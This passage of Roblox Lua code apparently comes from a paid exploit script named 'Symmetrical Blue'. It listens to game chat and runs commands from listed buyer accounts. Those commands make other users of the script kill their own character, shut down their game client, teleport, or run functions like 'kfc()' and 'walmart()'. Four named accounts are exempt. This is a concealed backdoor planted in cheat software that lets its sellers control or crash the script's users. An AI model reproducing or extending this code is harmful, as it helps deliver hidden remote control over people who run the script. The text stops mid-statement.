        pcall(function()
        for _, Player in pairs(game:GetService("Players"):GetPlayers()) do
            if table.find(BuyerList,Player.Name) then
                pcall(function()
                game.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(msg)
                    pcall(function()
                        if msg.Message == '.checkusers' then
                            if msg.FromSpeaker == Player.Name then
                                game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..Player.Name..' Yes I am indeed using Symmetrical Blue', 'All');
                            end
                        end
                        
                        if msg.Message == '.kill '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                else
                                    game:GetService("Players").LocalPlayer.Character:BreakJoints()
                                end
                            end
                        end 
        
                        if msg.Message == '.kill all' then
                            if msg.FromSpeaker == Player2.Name then
                                if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                else
                                    game:GetService("Players").LocalPlayer.Character:BreakJoints()
                                end
                            end
                        end 
                        
                        if msg.Message == '.shutdown '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                else
                                    wait(.9)
                                    game:Shutdown()
                                end
                            end
                        end  
                            
                        if msg.Message == '.shutdown all' then
                            if msg.FromSpeaker == Player2.Name then
                                if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                else
                                    wait(.9)
                                    game:Shutdown()
                                end
                            end
                        end

                        if msg.Message == '.bring '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player2.Name then
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Player.Character.HumanoidRootPart.Position)
                            end
                        end  
                            
                        if msg.Message == '.bring all' then
                            if msg.FromSpeaker == Player2.Name then
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Player.Character.HumanoidRootPart.Position)
                            end
                        end

                        if msg.Message == '.kfc '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player.Name then
                                if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                else
                                    kfc()
                                end
                            end
                        end  
        
                        if msg.Message == '.kfc all' then
                            if msg.FromSpeaker == Player.Name then
                                if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                else
                                    kfc()
                                end
                            end
                        end  
        
                        if msg.Message == '.walmart '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player.Name then
                                if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                else
                                    walmart()
                                end
                            end
                        end  
        
                        if msg.Message == '.walmart all' then
                            if msg.FromSpeaker == Player.Name then
                                if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
                                else
                                    walmart()
                                end
                            end
                        end 
        
                        if msg.Message == '.target '..game:GetService("Players").LocalPlayer.Name then
                            if msg.FromSpeaker == Player.Name then
                                if game:GetService("Players").LocalPlayer.Name == 'NotVeurects' or game:GetService("Players").LocalPlayer.Name == 'X3UnknownDevF13' or game:GetService("Players").LocalPlayer.Name == 'ALTTTTTTTTTTTTTTTT44' or game:GetService("Players").LocalPlayer.Name == 'dg2q' then
